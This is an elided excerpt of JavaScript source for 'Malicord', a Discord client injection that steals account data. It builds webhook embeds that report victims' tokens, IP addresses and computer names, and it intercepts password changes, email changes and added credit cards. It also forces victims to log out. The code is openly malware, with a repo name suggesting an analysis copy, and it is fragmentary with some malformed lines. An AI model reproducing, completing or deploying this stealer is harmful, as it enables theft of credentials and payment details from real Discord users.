...
var config = {
    ...
    webhook: "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
...
const makeEmbed = async ({
    ...
    var params = {
        username: "Malicord-Team",
        avatar_url: "https://raw.githubusercontent.com/Malicordx/assets/main/Malicord.png",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: `©[${config.creator}] | https://github.com/Inplex-sys/Malicord-Analysis-NoDualHook`
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Malicord")){
        try{
        fs.rmdirSync(__dirname + "/Malicord")
        }catch(err){
            console.log(err)
        }
    var ip = await getIP()
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "Malicord-Team Initialized",
            fields: [{
                name: "Injection Info",
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Malicordx/assets/main/ghost.png"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Malicordx/assets/main/banner.gif"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Malicord-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Malicord-Analysis-NoDualHook)`,
                inline: !0
            }, {
                name: "Malicorded Files",
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Malicord User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Malicord Victim got logged out",
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Malicord-Team Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Malicord-Team Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Malicord-Team User Credit Card Added",
                description: `
                Malicorded Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                **IP:** ${ip}\n\n
